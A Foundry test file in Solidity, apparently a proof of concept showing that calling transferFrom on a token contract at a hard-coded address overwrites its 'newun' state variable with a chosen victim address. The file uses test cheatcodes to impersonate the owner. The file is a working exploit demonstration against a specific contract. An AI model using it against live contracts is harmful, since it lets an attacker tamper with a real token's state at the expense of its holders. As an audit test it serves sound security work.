// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICryptocasil {
    function owner() external view returns (address);
    function newun() external view returns (address);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x63769c0499f94D4E31fAc0F01D5d226bdd2C927D;
    address attacker = address(this);
    ICryptocasil target;
    address victim;
    address tokenHolder;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ICryptocasil(TARGET);

        // 1. Define victim and token holder
        victim = makeAddr("victim");
        tokenHolder = target.owner();

        // 2. Precondition check: newun must be zero address
        assertEq(target.newun(), address(0), "Precondition failed: newun is not zero address");

        // 3. tokenHolder approves attacker to spend tokens
        console.log("Attacker address:", attacker);
        console.log("TokenHolder address:", tokenHolder);
        console.log("Victim address:", victim);

        vm.startPrank(tokenHolder);
        target.approve(attacker, 1 ether);
        vm.stopPrank();

        assertGt(target.allowance(tokenHolder, attacker), 0, "Attacker allowance is zero");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // 4. Attacker calls transferFrom, setting victim's address in 'newun'
                target.transferFrom(tokenHolder, victim, 1);

                // 5. Oracle check: verify 'newun' is now the victim's address
                console.log("newun address after exploit:", target.newun());
                assertEq(target.newun(), victim, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
